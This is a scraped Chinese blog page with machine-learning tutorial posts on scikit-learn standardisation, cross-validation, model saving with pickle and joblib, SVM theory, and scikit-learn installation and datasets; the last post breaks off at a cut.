-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import preprocessing</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x_train = np.array([[1, -100, 0.03],</span><br><span class="line">              [-1, 500, -0.02],</span><br><span class="line">              [0.2, 200, 0.04]], dtype=np.float64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(preprocessing.scale(x_train))</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn08.png?raw=true" alt=""></p>
-<p>可以看到，数据都被标准化到很接近的位置，这样就更利于学习器训练了。</p>
-<p>具体能产生多大的影响，我们可以通过datasets产生一组数据，对比直接训练和标准化之后训练的精度：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import preprocessing</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from sklearn.datasets.samples_generator import make_classification</span><br><span class="line">from sklearn.svm import SVC</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">X, y = make_classification(</span><br><span class="line">    n_samples=300, n_features=2,</span><br><span class="line">    n_redundant=0, n_informative=2,</span><br><span class="line">    n_clusters_per_class=1,scale=100)</span><br><span class="line"></span><br><span class="line">#可视化数据</span><br><span class="line">plt.scatter(X[:, 0], X[:, 1], c=y)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3)</span><br><span class="line">clf = SVC()</span><br><span class="line">clf.fit(X_train, y_train)</span><br><span class="line">print(clf.score(X_test, y_test))</span><br><span class="line"></span><br><span class="line">X = preprocessing.scale(X)</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3)</span><br><span class="line">clf = SVC()</span><br><span class="line">clf.fit(X_train, y_train)</span><br><span class="line">print(clf.score(X_test, y_test))</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn09.png?raw=true" alt=""></p>
-<p>在这个程序中使用datasets中的make_classification方法产生拥有两个特征值的分类数据，然后就可以将两个特征值分别放在横轴和纵轴来观察数据分布</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn10.png?raw=true" alt=""></p>
-<p>接着对比直接训练和标准化之后训练的精度，发现前后差距非常大。</p>
-<p>标准化还有一种常用的方式那就是将特征取值规定到一个范围（默认0-1），只需将最开始代码中标准化函数改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min_max_scaler = preprocessing.MinMaxScaler()</span><br><span class="line">X_MinMax = min_max_scaler.fit_transform(x_train)</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x03-交叉验证"><a href="#0x03-交叉验证" class="headerlink" title="0x03 交叉验证"></a>0x03 交叉验证</h2><p>之前在机器学习的模型评估方法里面学过几种模型验证的方法，其中也提到了，学习器训练完成后仍然在训练集种测试实际上是一种错误的方法，因为这个学习器在自身的训练集上很容易得到一个很高的分数，但是对新样本无法预测出任何有用的信息，这种情况被称为过拟合。</p>
-<p>所以为了避免这种情况，我们一般在验证的时候会将样本分为训练集和测试集，在之前的博客（ <a href="http://next.uuzdaisuki.com/2018/07/24/机器学习-5-——模型评估方法/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/07/24/机器学习-5-——模型评估方法/</a> ）介绍了留数法、交叉验证法、自助法这几种方法来分割训练集与测试集。</p>
-<p>前面的程序我们大多使用train_test_split方法将样本分为两部分，也就是留数法，那么这里就使用sklearn实现交叉验证法。</p>
-<p>交叉验证法需要用到sklearn的cross_val_score模块，我们就在刚才svm分类算法的基础上写出交叉验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import preprocessing</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from sklearn.datasets.samples_generator import make_classification</span><br><span class="line">from sklearn.svm import SVC</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from sklearn.model_selection import cross_val_score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#生成具有2种属性的300笔数据</span><br><span class="line">X, y = make_classification(</span><br><span class="line">    n_samples=300, n_features=2,</span><br><span class="line">    n_redundant=0, n_informative=2,</span><br><span class="line">    n_clusters_per_class=1,scale=100)</span><br><span class="line"></span><br><span class="line">#可视化数据</span><br><span class="line">plt.scatter(X[:, 0], X[:, 1], c=y)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">X = preprocessing.scale(X)</span><br><span class="line">clf = SVC()</span><br><span class="line"></span><br><span class="line">scores=cross_val_score(clf,X,y,cv=10,scoring=&apos;accuracy&apos;)</span><br><span class="line"></span><br><span class="line">print(scores)</span><br><span class="line">print(scores.mean())</span><br></pre></td></tr></table></figure></p>
-<p>数据分布如图：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn11.png?raw=true" alt=""></p>
-<p>输出十组分别的分数和平均分数：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn12.png?raw=true" alt=""></p>
-<p>交叉验证因为抽取的测试集更随机化且全部抽到，所以平均后的评估得分更令人信服。</p>
-<p>其中cross_val_score种的clf是模型，X样本特征，y是样本标签，cv是交叉验证的分组数量，scoring参数是计分指标，可以根据实际情况在官方文档选取合适的计分指标：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn13.png?raw=true" alt=""></p>
-<h2 id="0x04-模型保存"><a href="#0x04-模型保存" class="headerlink" title="0x04 模型保存"></a>0x04 模型保存</h2><p>在实际的机器学习运用中，训练用的样本量是十分大的，也就是说训练一个模型需要的时间开销非常大，我们要使用一个训练好的模型，每次都去重新训练一遍是不现实的，所以在训练好之后我们需要保存模型。</p>
-<p>我们常用的存取模型方法有如下两种</p>
-<h3 id="使用pickle保存模型"><a href="#使用pickle保存模型" class="headerlink" title="使用pickle保存模型"></a>使用pickle保存模型</h3><p>第一种方法是使用pickle库保存和读取模型，以上一篇博客中的k近邻算法为例：</p>
-<p>保存模型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.neighbors import KNeighborsClassifier</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line">iris_y = iris.target</span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier()</span><br><span class="line">knn.fit(iris_x,iris_y)</span><br><span class="line"></span><br><span class="line">file = open(&quot;model/knn.pickle&quot;,&quot;wb&quot;)</span><br><span class="line">pickle.dump(knn,file)</span><br></pre></td></tr></table></figure></p>
-<p>然后当前程序目录中model子目录下就会产生一个knn.pickle的文件。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn14.png?raw=true" alt=""></p>
-<p>读取模型：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line"></span><br><span class="line">file = open(&quot;model/knn.pickle&quot;,&quot;rb&quot;)</span><br><span class="line">knn=pickle.load(file)</span><br><span class="line"></span><br><span class="line">pred = knn.predict(iris_x[0:5])</span><br><span class="line">print(pred)</span><br></pre></td></tr></table></figure>
-<p>读取模型时直接读取这个文件，就可以使用现有模型，在以上代码中使用这个模型预测了前五个数据，我们都知道鸢尾花数据集前五个样本分类都是0，将它们放在这个模型中预测输出，发现也都是0。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn15.png?raw=true" alt=""></p>
-<h3 id="使用joblib保存模型"><a href="#使用joblib保存模型" class="headerlink" title="使用joblib保存模型"></a>使用joblib保存模型</h3><p>第二种方法是用sklearn的joblib模块保存，joblib库会自动多线程运行，所以在面对大数据的时候性能要优于pickle模块，但是joblib模块只能将文件保存在磁盘中，而且会产生多个文件。</p>
-<p>保存模型：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.neighbors import KNeighborsClassifier</span><br><span class="line">from sklearn.externals import joblib</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line">iris_y = iris.target</span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier()</span><br><span class="line">knn.fit(iris_x,iris_y)</span><br><span class="line"></span><br><span class="line">joblib.dump(knn,&apos;model/knn.pkl&apos;)</span><br></pre></td></tr></table></figure>
-<p>然后当前程序目录中model子目录下就会产生一个knn.pkl的文件，有时会产生多个文件，但是读取时只用读取第一个。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn16.png?raw=true" alt=""></p>
-<p>读取模型：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.externals import joblib</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">knn=joblib.load(&apos;model/knn.pkl&apos;)</span><br><span class="line"></span><br><span class="line">pred = knn.predict(iris_x[0:5])</span><br><span class="line">print(pred)</span><br></pre></td></tr></table></figure>
-<p>测试结果仍然成立。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn17.png?raw=true" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/31/机器学习-8-——支持向量机-SVM/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/07/31/机器学习-8-——支持向量机-SVM/" itemprop="url">
-                  机器学习(8)——支持向量机(SVM)
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-31T10:27:12+08:00">
-                2018-07-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/机器学习/" itemprop="url" rel="index">
-                    <span itemprop="name">机器学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/07/31/机器学习-8-——支持向量机-SVM/" class="leancloud_visitors" data-flag-title="机器学习(8)——支持向量机(SVM)">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-支持向量机"><a href="#0x00-支持向量机" class="headerlink" title="0x00 支持向量机"></a>0x00 支持向量机</h2><p>在机器学习中，支持向量机（support vector machine，常简称为SVM，又名支持向量网络）是在分类与回归分析中分析数据的监督式学习模型与相关的学习算法。给定一组训练实例，每个训练实例被标记为属于两个类别中的一个或另一个，SVM训练算法建立一个将新的实例分配给两个类别之一的模型，使其成为非概率二元（binary classifier）线性分类器。SVM模型是将实例表示为空间中的点，这样映射就使得单独类别的实例被尽可能宽的明显的间隔分开。然后，将新的实例映射到同一空间，并基于它们落在间隔的哪一侧来预测所属类别。</p>
-<h2 id="0x01-间隔与支持向量"><a href="#0x01-间隔与支持向量" class="headerlink" title="0x01 间隔与支持向量"></a>0x01 间隔与支持向量</h2><p>首先看一张图：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_01.png?raw=true" alt=""></p>
-<p>如果要用一条直线将两种类型的图形分开，那这样的直线我们可以找到很多条。那么哪条才是最好的分割线？</p>
-<p>我们可以设想一下，目前的样本并不代表所有可能发生的情况，如果进入新样本，很有可能会存在向直线贴近的样本，那么如果选择的直线到两边最近的点间隔越长，输入新样本时越过这条线的机会就越小，泛化能力就越强。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_05.png?raw=true" alt=""></p>
-<p>图中距离这条分割线最近的这几个点，就被称为支持向量。</p>
-<p>两个异类支持向量到这条直线的距离之和，就被称为间隔。</p>
-<p>假设我们分割线的方程如下：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_02.png?raw=true" alt=""></p>
-<p>其中w是法向量。</p>
-<p>我们的可以通过它将训练样本正确分类，即</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_03.png?raw=true" alt=""></p>
-<p>留出间隔，令：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_04.png?raw=true" alt=""></p>
-<p>则间隔的数学表示为：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_06.png?raw=true" alt=""></p>
-<p>我们为了找到最大间隔，也就是使γ最大，也就是使||w||²最小，就可以转换成找</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_07.png?raw=true" alt=""></p>
-<p>的最小值。这被称为支持向量机的基本型。</p>
-<h2 id="0x02-对偶问题"><a href="#0x02-对偶问题" class="headerlink" title="0x02 对偶问题"></a>0x02 对偶问题</h2><p>上面的问题最终转换成求支持向量机基本型的最小值问题，这是一个凸二次规划问题，可以直接求解，但是我们有更优的计算方法。那就是通过拉格朗日乘子法得到其”对偶问题“。</p>
-<p>具体做法是对每条约束都增加拉格朗日乘子αi，则该问题可以写成：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_08.png?raw=true" alt=""></p>
-<p>这个时候要求其最小值，从之前转换成最小值的模型前加了1/2这点就可以想到，我们接下来肯定要通过求导，求导数零点，找极值点来完成。</p>
-<p>所以分别对w和b求导可以得出：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_09.png?raw=true" alt=""></p>
-<p>将其结论代回L中可得对偶问题：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_10.png?raw=true" alt=""></p>
-<p>这个结果，我们就可以直接交给机器去处理数据求这个式子的最大值了。</p>
-<h2 id="0x03-核函数"><a href="#0x03-核函数" class="headerlink" title="0x03 核函数"></a>0x03 核函数</h2><p>线性可分的训练样本我们可以通过直线将其正确分类，但是如果遇到线性不可分的训练样本，或许就不能通过一条直线来进行分割。</p>
-<p>这种情况下，我们可以将样本从原本的空间映射到一个更高维度的空间，使样本在这个空间内线性可分。</p>
-<p>比如二维平面中的样本投影到三维空间中，就可以通过一个超平面线性分割两类样本了：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_11.png?raw=true" alt=""></p>
-<p>具体做法是用Φ(x)代表x映射之后的特征向量，对偶问题就变为：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_12.png?raw=true" alt=""></p>
-<p>在计算Φ(xi)的转置与Φ(xj)的矩阵乘积时，在高维会变的十分困难，所以就引入了：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_13.png?raw=true" alt=""></p>
-<p>Φ(xi)与Φ(xj)内积等于它们在原始样本空间通过k函数计算的结果，这样就不用去高维计算内积。这个k函数就被称为核函数。</p>
-<p>常用的核函数如下：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_14.png?raw=true" alt=""></p>
-<p>并不是所有的情况通过核函数映射之后都是线性可分的，我们会根据实际的情况去选取合适的核函数，使其映射到高维之后可以分割，然后高维分割的超平面在原始平面上的投影就是在原始平面上的分割曲线。</p>
-<h2 id="0x04-硬间隔和软间隔"><a href="#0x04-硬间隔和软间隔" class="headerlink" title="0x04 硬间隔和软间隔"></a>0x04 硬间隔和软间隔</h2><p>即使使用了核函数，实际中，我们仍然存在一种不可分的情况，即两类样本互相有一部分出现在对方的区域，如图：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_15.png?raw=true" alt=""></p>
-<p>那么这种情况，我们的处理方式就是允许支持向量机在一些样本上出错，也就是“软间隔”。</p>
-<p>对应的所有样本都被正确分类就被称为“硬间隔”。</p>
-<p>在之前机器学习的经验中我们都明白，出错就会有损失，那么我们需要一个损失函数来计算惩罚，最终的优化目标是在最大化间隔的同时使不满足约束的样本尽可能少，可写为：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_16.png?raw=true" alt=""></p>
-<p>这里面使用的损失函数是0/1损失函数：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_17.png?raw=true" alt=""></p>
-<p>我们也有其他几种替代损失函数可供选择：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_18.png?raw=true" alt=""></p>
-<p>在软间隔情况中，只使满足最终优化目标的值优化到最小即可。</p>
-<h2 id="0x05-支持向量机的优缺点"><a href="#0x05-支持向量机的优缺点" class="headerlink" title="0x05 支持向量机的优缺点"></a>0x05 支持向量机的优缺点</h2><p>支持向量机的优势在于:</p>
-<ul>
-<li><p>在高维空间中非常高效</p>
-</li>
-<li><p>即使在数据维度比样本数量大的情况下仍然有效</p>
-</li>
-<li><p>在决策函数（称为支持向量）中使用训练集的子集,因此它也是高效利用内存的</p>
-</li>
-<li><p>通用性: 不同的核函数 核函数与特定的决策函数一一对应，常见的kernel已<br>经提供,也可以指定定制的内核</p>
-</li>
-</ul>
-<p>支持向量机的缺点包括:</p>
-<ul>
-<li><p>如果特征数量比样本数量大得多,在选择核函数 核函数 时要避免过拟合,<br>而且正则化项是非常重要的</p>
-</li>
-<li><p>支持向量机不直接提供概率估计</p>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/30/python-scikit-learn学习-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/07/30/python-scikit-learn学习-1/" itemprop="url">
-                  python-scikit learn学习(1)
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-30T16:18:08+08:00">
-                2018-07-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/机器学习/" itemprop="url" rel="index">
-                    <span itemprop="name">机器学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/07/30/python-scikit-learn学习-1/" class="leancloud_visitors" data-flag-title="python-scikit learn学习(1)">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-scikit-learn"><a href="#0x00-scikit-learn" class="headerlink" title="0x00 scikit-learn"></a>0x00 scikit-learn</h2><p>Scikit-learn（以前称为scikits.learn）是一个用于Python编程语言的免费开源机器学习库。它广泛地支持各种分类、聚类以及回归分析方法比如支持向量机、随机森林、DBSCAN等等，由于其强大的功能、优异的拓展性以及易用性，目前受到了很多数据科学从业者的欢迎，也是业界相当著名的一个开源项目之一。</p>
-<h2 id="0x01-scikit-learn安装"><a href="#0x01-scikit-learn安装" class="headerlink" title="0x01 scikit-learn安装"></a>0x01 scikit-learn安装</h2><p>scikit-learn安装和别的python安装没有多少不同，不过安装scikit-learn之前要先安装新版本的numpy和scipy库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install numpy</span><br><span class="line">pip install scipy</span><br><span class="line">pip install scikit-learn</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x02-scikit-learn数据集"><a href="#0x02-scikit-learn数据集" class="headerlink" title="0x02 scikit-learn数据集"></a>0x02 scikit-learn数据集</h2><p>scikit-learn库中有一些标准数据集。在scikit-learn官网的数据库中有大量的数据集，可以直接拿来使用。</p>
-<p>官方数据集： <a href="http://scikit-learn.org/stable/modules/classes.html#module-sklearn.datasets" target="_blank" rel="noopener">http://scikit-learn.org/stable/modules/classes.html#module-sklearn.datasets</a></p>
-<p>其中Loaders都是现实中一些整理好的数据，可以直接使用。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn01.png?raw=true" alt=""></p>
-<p>Samples generator中是一些用户可以通过输入参数来控制随机生成的数据。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn02.png?raw=true" alt=""></p>
-<p>使用时我们要先导入sklearn.datasets库，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">iris = datasets.load_iris() #鸢尾花数据集</span><br><span class="line">print(iris)</span><br><span class="line">digits = datasets.load_digits() #数字数据集</span><br><span class="line">print(digits)</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>一个数据集是一个包含数据所有元素的类字典对象，这个数据存在‘.data’成员变量中，是一个n*n数组行表示样例，列表示特征。</li>
-<li>在监督学习中，一个或多个标签Y存储在‘.target’成员变量中。</li>
-</ul>
-<p>从如下代码运行结果就能看出这几部分数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">digits = datasets.load_digits() #数字数据集</span><br><span class="line">print(digits.data)</span><br><span class="line">print(digits.target)</span><br><span class="line">print(digits.images[0])</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-scikit-learn学习方法选择"><a href="#0x03-scikit-learn学习方法选择" class="headerlink" title="0x03 scikit-learn学习方法选择"></a>0x03 scikit-learn学习方法选择</h2><p>在学习和预测之前，我们要根据我们的数字数据集以及要达成的目标选择合适的机器学习方法，scikit-learn官网有一张图清晰的给出了如何去选择正确的方法：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn03.png?raw=true" alt=""></p>
-<p>官方网站提供的原图地址： <a href="http://scikit-learn.org/stable/tutorial/machine_learning_map/index.html" target="_blank" rel="noopener">http://scikit-learn.org/stable/tutorial/machine_learning_map/index.html</a></p>
-<p>我介绍一下具体步骤：</p>
-<ul>
-<li><p>这张图从start部分开始读，如果数据少于50，就去获取更多数据，如果数据大于50，就进入下一步。</p>
-</li>
-<li><p>然后根据是否预测类别、有无标签、是否预测数量等判断分别属于分类问题、聚类问题、回归问题和降维问题四种中的哪一种。</p>
-</li>
-<li><p>再根据数据量、数据类型等来分别选择合适的机器学习算法。</p>
-</li>
-</ul>
-<p>在选择好方法之后，从scikit-learn库导入对应的方法，然后根据官方提供的使用方法进行调用和参数的选用，就可以进行学习。</p>
-<h2 id="0x04-scikit-learn学习与预测（分类问题）"><a href="#0x04-scikit-learn学习与预测（分类问题）" class="headerlink" title="0x04 scikit-learn学习与预测（分类问题）"></a>0x04 scikit-learn学习与预测（分类问题）</h2><p>在这里以鸢尾花数据集的学习和预测为例，讲解一下通用的scikit-learn学习与预测步骤，先贴代码：</p>
